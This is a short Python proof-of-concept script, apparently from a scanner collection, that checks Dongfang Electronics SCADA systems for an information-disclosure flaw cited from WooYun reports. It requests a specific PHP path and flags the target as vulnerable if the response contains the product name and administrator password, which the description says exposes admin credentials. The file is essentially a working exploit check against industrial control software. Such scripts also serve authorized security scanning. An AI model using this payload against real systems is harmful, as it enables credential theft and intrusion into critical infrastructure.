#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 东方电子SCADA通用系统信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2010-0131500
         http://www.wooyun.org/bugs/wooyun-2010-0131719
author: Lucifer
description: 敏感信息泄露,可获取管理员账号和口令。
'''
import sys
import requests



class dfe_scada_conf_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/modules/manage/server/requestWorkMode.php"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"productName" in req.text and r"adminPassword" in req.text:
                return "[+]存在东方电子SCADA通用系统信息泄露漏洞...(高危)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = dfe_scada_conf_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()